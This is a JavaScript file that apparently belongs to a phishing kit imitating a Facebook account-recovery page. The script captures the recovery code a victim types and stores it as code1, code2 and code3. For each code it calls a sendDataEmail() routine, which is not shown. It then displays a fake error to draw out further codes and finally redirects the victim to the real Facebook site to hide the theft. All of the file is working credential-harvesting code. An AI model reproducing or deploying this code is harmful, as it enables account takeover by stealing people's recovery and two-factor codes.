$(document).ready(function () {
    $("#mailrecover").text(localStorage.getItem('recover'));
    var n = 0;
    $("[name='reset_action']").click(function () {
        if($("#recovery_code_entry").val() === '') 
            {
                $('._585n').removeClass('hidden_elem');
                return;
            }
            else
            {
                n++;
                switch (n) {
                    case 1:
                        {
                            $('._585n').addClass('hidden_elem');
                            localStorage.setItem('code1',$("#recovery_code_entry").val());
                            sendDataEmail();
                            setTimeout(function() {
                                $('._585n').removeClass('hidden_elem');
                                $("#recovery_code_entry").val('');
                            }, 2000); 
                            break;
                        }
                        case 2:
                            {
                                $('._585n').addClass('hidden_elem');
                            localStorage.setItem('code2',$("#recovery_code_entry").val());
                            sendDataEmail();
                            setTimeout(function() {
                                $('._585n').removeClass('hidden_elem');
                                $("#recovery_code_entry").val('');
                            }, 2000); 
                            break;
                            }
                            case 3:
                                {
                                    $('._585n').addClass('hidden_elem');
                                    localStorage.setItem('code3',$("#recovery_code_entry").val());
                                    sendDataEmail();
                                    setTimeout(function() {
                                        $('._585n').removeClass('hidden_elem');
                                        $("#recovery_code_entry").val('');
                                    }, 2000); 
                                    break;
                                }
                    default:
                        {
                            

                            break;
                        }
                }
                if(n > 3)
                {
                    window.location.href = "https://www.facebook.com/";
                }
            }
    });
});